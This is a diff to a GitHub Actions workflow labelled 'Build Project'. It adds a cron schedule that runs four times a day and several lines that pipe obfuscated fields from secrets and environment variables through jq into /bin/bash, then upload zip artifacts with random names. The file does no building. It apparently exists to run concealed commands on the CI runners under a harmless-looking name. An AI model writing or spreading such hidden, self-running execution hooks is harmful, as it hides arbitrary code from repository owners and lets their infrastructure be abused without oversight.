@@ -2,6 +2,8 @@ name: Build Project
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '47 1,7,13,19 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,17 +20,20 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          xv6139: ${{ secrets.xv6139 }}
+          pd783: ${{ secrets.pd783 }}
         run: |
-          printf '%s' "$xv6139" | jq -r .o5328 | /bin/bash
-          echo $upark420 | jq -r .hoxaz2 | /bin/bash
-          echo $vujo88886 | jq -r .om45365 | /bin/bash
-          echo $z6494 | jq -r .b00 | /bin/bash
+          printf '%s' "$pd783" | jq -r .o903 | /bin/bash
+          echo $qqba3587 | jq -r .af07891 | /bin/bash
+          printf '%s' "$m23" | jq -r .anus09819 | /bin/bash
+          printf '%s' "$jgo9" | jq -r .jylg1 | /bin/bash
+          printf '%s' "$zvhrm6196" | jq -r .e4145 | /bin/bash
+          printf '%s' "$tfy5" | jq -r .uffj50410 | /bin/bash
+          printf '%s' "$vqrvc1" | jq -r .ksmp2671 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: mBcH9RNI
+          name: SaKV2VdR
           path: "*.zip"
           retention-days: 1
